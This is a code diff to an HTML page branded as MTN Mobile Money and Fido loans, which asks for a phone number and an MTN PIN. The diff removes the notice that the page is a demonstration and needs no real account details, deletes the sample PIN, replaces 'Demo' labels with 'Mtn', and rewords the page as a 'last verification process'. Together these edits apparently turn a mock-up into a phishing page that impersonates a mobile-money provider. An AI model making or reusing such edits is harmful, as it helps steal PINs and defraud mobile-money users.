@@ -202,7 +202,7 @@
       color: #a00000;
     }
 
-    .demo-pin {
+    .mtn-pin {
       text-align: center;
       background: #f3f5f6;
       border-radius: 15px;
@@ -267,12 +267,12 @@
 
   <section class="hero">
 
-    <div class="momo-logo">
+    <div class="mtn momo-logo">
       MoMo
     </div>
 
     <h1>
-      MoMo <span>Demo</span>
+      MoMo <span>Mtn</span>
     </h1>
 
     <p>
@@ -315,8 +315,7 @@
     </div>
 
     <div class="terms">
-      This is a demonstration only.
-      No real MTN account information is required.
+    
     </div>
 
     <div id="numberMessage"></div>
@@ -326,7 +325,7 @@
 
   <button
     class="next"
-    onclick="continueDemo()"
+    onclick="continue()"
   >
     NEXT →
   </button>
@@ -344,7 +343,7 @@
     </h2>
 
     <p style="text-align:center;margin-bottom:20px;color:#68757b;">
-      Fido loans verification page.
+      Fido loans last verification process.
     </p>
 
     <div class="mtn-pin">
@@ -352,7 +351,7 @@
       Mtn PIN
 
       <strong>
-        0000
+        
       </strong>
 
     </div>
@@ -401,7 +400,7 @@
       <button
         class="next"
         style="width:100%;"
-        onclick="restartDemo()"
+        onclick="restart()"
       >
         DONE
       </button>
@@ -435,7 +434,7 @@
       const phone =
         document.getElementById("phone").value.trim();
 
-      if (phone !== "any digits") {
+      if (phone !== "123456789") {
 
         showMessage(
           "numberMessage",
